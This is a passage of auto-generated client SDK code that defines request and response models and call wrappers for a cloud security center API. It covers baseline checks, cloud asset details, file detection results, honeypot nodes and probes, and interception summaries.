  var params = new OpenApi.Params{
    action = 'GetCheckDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getCheckDetail(request: GetCheckDetailRequest): GetCheckDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCheckDetailWithOptions(request, runtime);
}

model GetCheckProcessRequest {
  taskId?: string(name='TaskId', example='5347c7b6-c85c-4070-846a-3029e08e****'),
}

model GetCheckProcessResponseBody = {
  finishCount?: int32(name='FinishCount', example='80'),
  requestId?: string(name='RequestId', example='D18B5DAD-BA97-5552-AE48-83F59D5F****'),
  totalCount?: int32(name='TotalCount', example='113'),
}

model GetCheckProcessResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCheckProcessResponseBody(name='body'),
}

async function getCheckProcessWithOptions(request: GetCheckProcessRequest, runtime: Util.RuntimeOptions): GetCheckProcessResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCheckProcess',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getCheckProcess(request: GetCheckProcessRequest): GetCheckProcessResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCheckProcessWithOptions(request, runtime);
}

model GetCheckRiskStatisticsRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  lang?: string(name='Lang', example='zh'),
  pageSize?: int32(name='PageSize', example='20'),
}

model GetCheckRiskStatisticsResponseBody = {
  count?: int32(name='Count', example='3'),
  data?: [ 
    {
      highWarningCount?: int32(name='HighWarningCount', example='43'),
      lowWarningCount?: int32(name='LowWarningCount', example='3'),
      mediumWarningCount?: int32(name='MediumWarningCount', example='29'),
      passCount?: int32(name='PassCount', example='143'),
      sceneName?: string(name='SceneName', example='SECURITY'),
      subStatistics?: [ 
        {
          alias?: string(name='Alias', example='weak_password'),
          highWarningCount?: int32(name='HighWarningCount', example='3'),
          lowWarningCount?: int32(name='LowWarningCount', example='0'),
          mediumWarningCount?: int32(name='MediumWarningCount', example='0'),
          passCount?: int32(name='PassCount', example='2'),
          totalCount?: int32(name='TotalCount', example='5'),
          typeName?: string(name='TypeName', example='weak_password'),
        }
      ](name='SubStatistics'),
      totalCount?: int32(name='TotalCount', example='219'),
    }
  ](name='Data'),
  requestId?: string(name='RequestId', example='2C455672-2490-5211-84EC-420C7818****'),
}

model GetCheckRiskStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCheckRiskStatisticsResponseBody(name='body'),
}

async function getCheckRiskStatisticsWithOptions(request: GetCheckRiskStatisticsRequest, runtime: Util.RuntimeOptions): GetCheckRiskStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCheckRiskStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getCheckRiskStatistics(request: GetCheckRiskStatisticsRequest): GetCheckRiskStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCheckRiskStatisticsWithOptions(request, runtime);
}

model GetCheckSummaryRequest {
  lang?: string(name='Lang'),
  resourceDirectoryAccountId?: string(name='ResourceDirectoryAccountId'),
}

model GetCheckSummaryResponseBody = {
  requestId?: string(name='RequestId'),
  summarys?: [ 
    {
      failCount?: int32(name='FailCount'),
      passCount?: long(name='PassCount'),
      standards?: [ 
        {
          failCount?: int32(name='FailCount'),
          id?: long(name='Id'),
          passCount?: int32(name='PassCount'),
          riskLevelHighCount?: int32(name='RiskLevelHighCount'),
          riskLevelLowCount?: int32(name='RiskLevelLowCount'),
          riskLevelMediumCount?: int32(name='RiskLevelMediumCount'),
          showName?: string(name='ShowName'),
        }
      ](name='Standards'),
      type?: string(name='Type'),
    }
  ](name='Summarys'),
}

model GetCheckSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCheckSummaryResponseBody(name='body'),
}

async function getCheckSummaryWithOptions(request: GetCheckSummaryRequest, runtime: Util.RuntimeOptions): GetCheckSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCheckSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getCheckSummary(request: GetCheckSummaryRequest): GetCheckSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCheckSummaryWithOptions(request, runtime);
}

model GetClientUserDefineRuleRequest {
  id?: long(name='Id'),
}

model GetClientUserDefineRuleResponseBody = {
  requestId?: string(name='RequestId'),
  userDefineRuleDetail?: {
    actionType?: string(name='ActionType'),
    cmdline?: string(name='Cmdline'),
    filePath?: string(name='FilePath'),
    gmtCreate?: long(name='GmtCreate'),
    gmtModified?: long(name='GmtModified'),
    IP?: string(name='IP'),
    id?: long(name='Id'),
    md5List?: string(name='Md5List'),
    name?: string(name='Name'),
    newFilePath?: string(name='NewFilePath'),
    parentCmdline?: string(name='ParentCmdline'),
    parentProcPath?: string(name='ParentProcPath'),
    platform?: string(name='Platform'),
    port?: int32(name='Port'),
    portStr?: string(name='PortStr'),
    procPath?: string(name='ProcPath'),
    registryContent?: string(name='RegistryContent'),
    registryKey?: string(name='RegistryKey'),
    type?: int32(name='Type'),
  }(name='UserDefineRuleDetail'),
}

model GetClientUserDefineRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetClientUserDefineRuleResponseBody(name='body'),
}

async function getClientUserDefineRuleWithOptions(request: GetClientUserDefineRuleRequest, runtime: Util.RuntimeOptions): GetClientUserDefineRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetClientUserDefineRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getClientUserDefineRule(request: GetClientUserDefineRuleRequest): GetClientUserDefineRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return getClientUserDefineRuleWithOptions(request, runtime);
}

model GetCloudAssetDetailRequest {
  assetSubType?: int32(name='AssetSubType', example='0'),
  assetType?: int32(name='AssetType', example='14'),
  cloudAssetInstances?: [ 
    {
      instanceId?: string(name='InstanceId', example='sg-wz9hf86vbzbrrde7****'),
      regionId?: string(name='RegionId', example='cn-hangzhou'),
    }
  ](name='CloudAssetInstances'),
  vendor?: int32(name='Vendor', example='0'),
}

model GetCloudAssetDetailResponseBody = {
  count?: int32(name='Count', example='1'),
  instances?: [ 
    {
      alarmStatus?: string(name='AlarmStatus', example='NO'),
      assetSubType?: int32(name='AssetSubType', example='0'),
      assetSubTypeName?: string(name='AssetSubTypeName', example='INSTANCE'),
      assetType?: int32(name='AssetType', example='3'),
      assetTypeName?: string(name='AssetTypeName', example='RDS'),
      createdTime?: long(name='CreatedTime', example='1607365213000'),
      detailLink?: string(name='DetailLink', example='https://rdsnext.console.aliyun.com/detail/rm-uf6t6u05n6g48****/basicInfo?region=cn-shanghai'),
      instanceId?: string(name='InstanceId', example='rm-uf6t6u05n6g48****'),
      instanceName?: string(name='InstanceName', example='yztest-l***'),
      internetIp?: string(name='InternetIp', example='1.2.XX.XX'),
      regionId?: string(name='RegionId', example='cn-hanghzou'),
      riskStatus?: string(name='RiskStatus', example='NO'),
      securityInfo?: string(name='SecurityInfo', example='{\\"seriousNum\\":0,\\"appNum\\":0,\\"baselineMedium\\":0,\\"remindNum\\":0,\\"imageVulNntf\\":0,\\"cveNum\\":0,\\"vul\\":0,\\"uuid\\":\\"rm-uf6t6u05n6g485o70\\",\\"emgNum\\":0,\\"weakPWNum\\":0,\\"imageMaliciousFileRemind\\":0,\\"imageBaselineMedium\\":0,\\"laterVulCount\\":0,\\"cmsNum\\":0,\\"imageMaliciousFileSerious\\":0,\\"agentlessMalicious\\":0,\\"suspNum\\":0,\\"imageBaselineHigh\\":0,\\"asapVulCount\\":0,\\"imageVulLater\\":0,\\"agentlessAll\\":0,\\"sysNum\\":0,\\"containerLater\\":0,\\"containerSuspicious\\":0,\\"imageBaselineNum\\":0,\\"newSuspicious\\":0,\\"nntfVulCount\\":0,\\"scaNum\\":0,\\"containerNntf\\":0,\\"health\\":0,\\"trojan\\":0,\\"suspicious\\":0,\\"imageMaliciousFileSuspicious\\":0,\\"containerRemind\\":0,\\"baselineLow\\":0,\\"imageVulAsap\\":0,\\"imageBaselineLow\\":0,\\"containerAsap\\":0,\\"agentlessBaseline\\":0,\\"agentlessVulSca\\":0,\\"agentlessVulCve\\":0,\\"containerSerious\\":0,\\"baselineHigh\\":0,\\"account\\":0,\\"baselineNum\\":6}'),
      vendor?: int32(name='Vendor', example='0'),
    }
  ](name='Instances'),
  requestId?: string(name='RequestId', example='CB45CAED-31C3-517A-8619-10F632D3****'),
}

model GetCloudAssetDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCloudAssetDetailResponseBody(name='body'),
}

async function getCloudAssetDetailWithOptions(request: GetCloudAssetDetailRequest, runtime: Util.RuntimeOptions): GetCloudAssetDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.assetSubType)) {
    query['AssetSubType'] = request.assetSubType;
  }
  if (!Util.isUnset(request.assetType)) {
    query['AssetType'] = request.assetType;
  }
  if (!Util.isUnset(request.cloudAssetInstances)) {
    query['CloudAssetInstances'] = request.cloudAssetInstances;
  }
  if (!Util.isUnset(request.vendor)) {
    query['Vendor'] = request.vendor;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCloudAssetDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getCloudAssetDetail(request: GetCloudAssetDetailRequest): GetCloudAssetDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCloudAssetDetailWithOptions(request, runtime);
}

model GetCloudAssetSummaryResponseBody = {
  groupedFields?: {
    cloudAssetSummaryMetas?: [ 
      {
        assetSubType?: int32(name='AssetSubType', example='0'),
        assetType?: int32(name='AssetType', example='16'),
        instanceCount?: int32(name='InstanceCount', example='16'),
        instanceRiskCount?: int32(name='InstanceRiskCount', example='5'),
      }
    ](name='CloudAssetSummaryMetas'),
    instanceCountTotal?: int32(name='InstanceCountTotal', example='919'),
    instanceRiskCountTotal?: int32(name='InstanceRiskCountTotal', example='544'),
  }(name='GroupedFields'),
  requestId?: string(name='RequestId', example='F5CF78A7-30AA-59DB-847F-13EE3AE7****'),
}

model GetCloudAssetSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCloudAssetSummaryResponseBody(name='body'),
}

async function getCloudAssetSummaryWithOptions(runtime: Util.RuntimeOptions): GetCloudAssetSummaryResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetCloudAssetSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getCloudAssetSummary(): GetCloudAssetSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCloudAssetSummaryWithOptions(runtime);
}

model GetClusterCheckItemWarningStatisticsRequest {
  clusterId?: string(name='ClusterId', example='cd49575861a3044d49c954e4b3911****'),
}

model GetClusterCheckItemWarningStatisticsResponseBody = {
  data?: {
    highWarningCount?: int32(name='HighWarningCount', example='3'),
    lowWarningCount?: int32(name='LowWarningCount', example='1'),
    mediumWarningCount?: int32(name='MediumWarningCount', example='2'),
  }(name='Data'),
  requestId?: string(name='RequestId', example='C2B285A3-3493-5C5F-A224-4CCE4BFC****'),
}

model GetClusterCheckItemWarningStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetClusterCheckItemWarningStatisticsResponseBody(name='body'),
}

async function getClusterCheckItemWarningStatisticsWithOptions(request: GetClusterCheckItemWarningStatisticsRequest, runtime: Util.RuntimeOptions): GetClusterCheckItemWarningStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetClusterCheckItemWarningStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getClusterCheckItemWarningStatistics(request: GetClusterCheckItemWarningStatisticsRequest): GetClusterCheckItemWarningStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return getClusterCheckItemWarningStatisticsWithOptions(request, runtime);
}

model GetClusterSuspEventStatisticsRequest {
  clusterId?: string(name='ClusterId'),
  from?: string(name='From'),
}

model GetClusterSuspEventStatisticsResponseBody = {
  requestId?: string(name='RequestId'),
  suspStatistics?: {
    remind?: int32(name='Remind'),
    serious?: int32(name='Serious'),
    suspicious?: int32(name='Suspicious'),
  }(name='SuspStatistics'),
}

model GetClusterSuspEventStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetClusterSuspEventStatisticsResponseBody(name='body'),
}

async function getClusterSuspEventStatisticsWithOptions(request: GetClusterSuspEventStatisticsRequest, runtime: Util.RuntimeOptions): GetClusterSuspEventStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetClusterSuspEventStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getClusterSuspEventStatistics(request: GetClusterSuspEventStatisticsRequest): GetClusterSuspEventStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return getClusterSuspEventStatisticsWithOptions(request, runtime);
}

model GetFileDetectApiInvokeInfoResponseBody = {
  data?: {
    authCount?: long(name='AuthCount'),
    expire?: long(name='Expire'),
    flowRate?: int32(name='FlowRate'),
    remainAuthCount?: long(name='RemainAuthCount'),
    saleVersion?: int32(name='SaleVersion'),
    timeUnit?: string(name='TimeUnit'),
  }(name='Data'),
  requestId?: string(name='RequestId'),
}

model GetFileDetectApiInvokeInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetFileDetectApiInvokeInfoResponseBody(name='body'),
}

async function getFileDetectApiInvokeInfoWithOptions(runtime: Util.RuntimeOptions): GetFileDetectApiInvokeInfoResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetFileDetectApiInvokeInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getFileDetectApiInvokeInfo(): GetFileDetectApiInvokeInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return getFileDetectApiInvokeInfoWithOptions(runtime);
}

model GetFileDetectResultRequest {
  hashKeyList?: [ string ](name='HashKeyList'),
  sourceIp?: string(name='SourceIp'),
  type?: int32(name='Type'),
}

model GetFileDetectResultResponseBody = {
  requestId?: string(name='RequestId'),
  resultList?: [ 
    {
      code?: string(name='Code'),
      ext?: string(name='Ext'),
      hashKey?: string(name='HashKey'),
      message?: string(name='Message'),
      result?: int32(name='Result'),
      score?: int32(name='Score'),
      virusType?: string(name='VirusType'),
    }
  ](name='ResultList'),
}

model GetFileDetectResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetFileDetectResultResponseBody(name='body'),
}

async function getFileDetectResultWithOptions(request: GetFileDetectResultRequest, runtime: Util.RuntimeOptions): GetFileDetectResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.hashKeyList)) {
    query['HashKeyList'] = request.hashKeyList;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetFileDetectResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getFileDetectResult(request: GetFileDetectResultRequest): GetFileDetectResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return getFileDetectResultWithOptions(request, runtime);
}

model GetHoneypotNodeRequest {
  nodeId?: string(name='NodeId'),
}

model GetHoneypotNodeResponseBody = {
  code?: string(name='Code'),
  honeypotNode?: {
    allowHoneypotAccessInternet?: boolean(name='AllowHoneypotAccessInternet'),
    createTime?: string(name='CreateTime'),
    ecsInstanceId?: string(name='EcsInstanceId'),
    honeypotTotalCount?: int32(name='HoneypotTotalCount'),
    honeypotUsedCount?: int32(name='HoneypotUsedCount'),
    nodeId?: string(name='NodeId'),
    nodeIp?: string(name='NodeIp'),
    nodeName?: string(name='NodeName'),
    probeTotalCount?: int32(name='ProbeTotalCount'),
    probeUsedCount?: int32(name='ProbeUsedCount'),
    securityGroupProbeIpList?: [ string ](name='SecurityGroupProbeIpList'),
    totalStatus?: int32(name='TotalStatus'),
    upgradeAvailable?: boolean(name='UpgradeAvailable'),
  }(name='HoneypotNode'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model GetHoneypotNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetHoneypotNodeResponseBody(name='body'),
}

async function getHoneypotNodeWithOptions(request: GetHoneypotNodeRequest, runtime: Util.RuntimeOptions): GetHoneypotNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetHoneypotNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getHoneypotNode(request: GetHoneypotNodeRequest): GetHoneypotNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return getHoneypotNodeWithOptions(request, runtime);
}

model GetHoneypotPresetRequest {
  honeypotPresetId?: string(name='HoneypotPresetId'),
  lang?: string(name='Lang'),
}

model GetHoneypotPresetResponseBody = {
  code?: string(name='Code'),
  data?: {
    controlNodeName?: string(name='ControlNodeName'),
    fileInfoList?: [ 
      {
        fileId?: string(name='FileId'),
        fileName?: string(name='FileName'),
        ossUrl?: string(name='OssUrl'),
      }
    ](name='FileInfoList'),
    honeypotImageDisplayName?: string(name='HoneypotImageDisplayName'),
    honeypotImageName?: string(name='HoneypotImageName'),
    honeypotPresetId?: string(name='HoneypotPresetId'),
    meta?: string(name='Meta'),
    nodeId?: string(name='NodeId'),
    presetName?: string(name='PresetName'),
    presetType?: string(name='PresetType'),
  }(name='Data'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model GetHoneypotPresetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetHoneypotPresetResponseBody(name='body'),
}

async function getHoneypotPresetWithOptions(request: GetHoneypotPresetRequest, runtime: Util.RuntimeOptions): GetHoneypotPresetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotPresetId)) {
    query['HoneypotPresetId'] = request.honeypotPresetId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetHoneypotPreset',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getHoneypotPreset(request: GetHoneypotPresetRequest): GetHoneypotPresetResponse {
  var runtime = new Util.RuntimeOptions{};
  return getHoneypotPresetWithOptions(request, runtime);
}

model GetHoneypotProbeRequest {
  probeId?: string(name='ProbeId', example='d6c1ebc9-a90d-4c9e-9490-328814d1ca00'),
}

model GetHoneypotProbeResponseBody = {
  code?: string(name='Code'),
  data?: {
    arp?: boolean(name='Arp', example='true'),
    canListenIpList?: [ string ](name='CanListenIpList'),
    cidrList?: [ string ](name='CidrList'),
    controlNode?: {
      ecsInstanceId?: string(name='EcsInstanceId', example='i-bp19ijepxytwtzrkopxl'),
      nodeId?: string(name='NodeId', example='37a15ff1-3475-4897-aa6c-f7fd9122ad06'),
      nodeName?: string(name='NodeName'),
    }(name='ControlNode'),
    cpuLoad?: double(name='CpuLoad'),
    deployTime?: long(name='DeployTime'),
    displayName?: string(name='DisplayName', example='test-probe'),
    honeyPotProbeScanPort?: {
      id?: long(name='Id', example='15389'),
      ports?: string(name='Ports', example='{\\"tcp\\":\\"1-65535\\",\\"udp\\":\\"1-65535\\"}'),
      probeId?: string(name='ProbeId', example='a46f5162-c70d-4e26-8ddf-7435feca9305'),
      serviceIpList?: [ string ](name='ServiceIpList'),
      status?: int32(name='Status', example='2'),
    }(name='HoneyPotProbeScanPort'),
    honeypotProbeBindList?: [ 
      {
        bindId?: string(name='BindId', example='45378f64-d7b4-4a53-9c48-4303eb4b7dbc'),
        bindPortList?: [ 
          {
            bindPort?: boolean(name='BindPort', example='false'),
            endPort?: int32(name='EndPort', example='80'),
            err?: string(name='Err', example='portmap failed'),
            fixed?: boolean(name='Fixed', example='false'),
            id?: long(name='Id', example='2512'),
            msg?: string(name='Msg'),
            proto?: string(name='Proto', example='tcp'),
            startPort?: int32(name='StartPort', example='22'),
            status?: int32(name='Status', example='1'),
            targetPort?: int32(name='TargetPort', example='80'),
          }
        ](name='BindPortList'),
        honeypotId?: string(name='HoneypotId', example='913347774a3b3c378c6a50f66de23dfa097765214ec3f0526b01c67bf59c7ed3'),
        serviceIpList?: [ string ](name='ServiceIpList'),
        status?: int32(name='Status', example='3'),
      }
    ](name='HoneypotProbeBindList'),
    hostIp?: string(name='HostIp', example='33.53.240.12'),
    listenIpList?: [ string ](name='ListenIpList'),
    memoryLoad?: double(name='MemoryLoad'),
    osType?: string(name='OsType', example='windows'),
    ping?: boolean(name='Ping', example='false'),
    probeId?: string(name='ProbeId', example='40f6501d-45ec-4bf0-b813-0072ceb4c820'),
    probeType?: string(name='ProbeType', example='host_probe'),
    probeVersion?: string(name='ProbeVersion', example='18060096'),
    proxyIp?: string(name='ProxyIp', example='47.108.176.59'),
    status?: int32(name='Status', example='3'),
    uuid?: string(name='Uuid', example='6690a46c-0edb-4663-a641-3629d1a9****'),
    vpcId?: string(name='VpcId', example='vpc-2vchkxmf2j9yjt3x258zf'),
  }(name='Data'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model GetHoneypotProbeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetHoneypotProbeResponseBody(name='body'),
}

async function getHoneypotProbeWithOptions(request: GetHoneypotProbeRequest, runtime: Util.RuntimeOptions): GetHoneypotProbeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.probeId)) {
    query['ProbeId'] = request.probeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetHoneypotProbe',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getHoneypotProbe(request: GetHoneypotProbeRequest): GetHoneypotProbeResponse {
  var runtime = new Util.RuntimeOptions{};
  return getHoneypotProbeWithOptions(request, runtime);
}

model GetImageScanNumInPeriodRequest {
  pastDay?: string(name='PastDay', example='7'),
}

model GetImageScanNumInPeriodResponseBody = {
  imageScanData?: {
    imageScanCount?: int32(name='ImageScanCount', example='150'),
  }(name='ImageScanData'),
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42B5E92****'),
}

model GetImageScanNumInPeriodResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetImageScanNumInPeriodResponseBody(name='body'),
}

async function getImageScanNumInPeriodWithOptions(request: GetImageScanNumInPeriodRequest, runtime: Util.RuntimeOptions): GetImageScanNumInPeriodResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.pastDay)) {
    query['PastDay'] = request.pastDay;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetImageScanNumInPeriod',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getImageScanNumInPeriod(request: GetImageScanNumInPeriodRequest): GetImageScanNumInPeriodResponse {
  var runtime = new Util.RuntimeOptions{};
  return getImageScanNumInPeriodWithOptions(request, runtime);
}

model GetInterceptionSummaryResponseBody = {
  interceptionSummary?: {
    closeClusterCount?: int32(name='CloseClusterCount', example='0'),
    closeRuleCount?: int32(name='CloseRuleCount', example='0'),
    clusterCount?: int32(name='ClusterCount', example='0'),
    openClusterCount?: int32(name='OpenClusterCount', example='0'),
    openRuleCount?: int32(name='OpenRuleCount', example='0'),
    riskCount180Day?: long(name='RiskCount180Day', example='0'),
    riskCount30Day?: long(name='RiskCount30Day', example='0'),
    riskCountToday?: long(name='RiskCountToday', example='0'),
    ruleCount?: int32(name='RuleCount', example='0'),
  }(name='InterceptionSummary'),
  requestId?: string(name='RequestId', example='F35F45B0-5D6B-4238-BE02-A62D0760E840'),
}

model GetInterceptionSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetInterceptionSummaryResponseBody(name='body'),
}

async function getInterceptionSummaryWithOptions(runtime: Util.RuntimeOptions): GetInterceptionSummaryResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetInterceptionSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getInterceptionSummary(): GetInterceptionSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return getInterceptionSummaryWithOptions(runtime);
}

model GetInterceptionTargetDetailRequest {
  targetId?: long(name='TargetId', example='402008'),
}

model GetInterceptionTargetDetailResponseBody = {
  requestId?: string(name='RequestId', example='D65AADFC-1D20-5A6A-8F6A-9FA53C0DC1F8'),
  ruleTarget?: {
    appName?: string(name='AppName', example='netperf-client'),
    clusterId?: string(name='ClusterId', example='ca6e6594def8d4be8b2795fd12c32****'),
    clusterName?: string(name='ClusterName', example='sas-test-cnnf'),
